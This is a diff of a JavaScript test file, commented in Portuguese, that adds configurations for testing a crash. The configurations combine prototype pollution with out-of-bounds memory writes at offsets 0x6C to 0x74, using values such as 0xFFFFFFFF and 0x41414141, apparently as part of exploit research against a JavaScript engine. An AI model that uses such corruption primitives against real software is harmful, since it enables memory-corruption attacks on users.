@@ -26,7 +26,52 @@ export async function runAllAdvancedTestsS3() {
 
     // --- Defina aqui as configurações de teste que você quer rodar ---
     const testsToRun = [
-        
+        { // 1. Cenário original que causou o crash
+            iterationName: "OriginalCrashCase",
+            enablePrototypePollution: true,
+            enableOOBWrite: true,
+            corruption_offset: 0x70,
+            value_to_write: 0xFFFFFFFF,
+            bytes_to_write_for_corruption: 4,
+        },
+        { // 2. Apenas Poluição de Protótipo (PP), sem escrita OOB
+            iterationName: "OnlyPP",
+            enablePrototypePollution: true,
+            enableOOBWrite: false, // OOB desabilitado
+            // corruption_offset e value_to_write não serão usados
+        },
+        { // 3. Apenas escrita OOB (no offset problemático), sem PP
+            iterationName: "OnlyOOB_0x70_FFFFFFFF",
+            enablePrototypePollution: false, // PP desabilitada
+            enableOOBWrite: true,
+            corruption_offset: 0x70,
+            value_to_write: 0xFFFFFFFF,
+            bytes_to_write_for_corruption: 4,
+        },
+        { // 4. PP + OOB, mas com offset ligeiramente diferente (antes)
+            iterationName: "PP_OOB_Offset_0x6C",
+            enablePrototypePollution: true,
+            enableOOBWrite: true,
+            corruption_offset: 0x6C, // Novo offset
+            value_to_write: 0xFFFFFFFF,
+            bytes_to_write_for_corruption: 4,
+        },
+        { // 5. PP + OOB, mas com offset ligeiramente diferente (depois)
+            iterationName: "PP_OOB_Offset_0x74",
+            enablePrototypePollution: true,
+            enableOOBWrite: true,
+            corruption_offset: 0x74, // Novo offset
+            value_to_write: 0xFFFFFFFF,
+            bytes_to_write_for_corruption: 4,
+        },
+        { // 6. PP + OOB (offset original), mas com valor 0x0
+            iterationName: "PP_OOB_0x70_Value_0x0",
+            enablePrototypePollution: true,
+            enableOOBWrite: true,
+            corruption_offset: 0x70,
+            value_to_write: 0x00000000, // Novo valor
+            bytes_to_write_for_corruption: 4,
+        },
         { // 7. PP + OOB (offset original), mas com valor 0x41414141
             iterationName: "PP_OOB_0x70_Value_0x41414141",
             enablePrototypePollution: true,
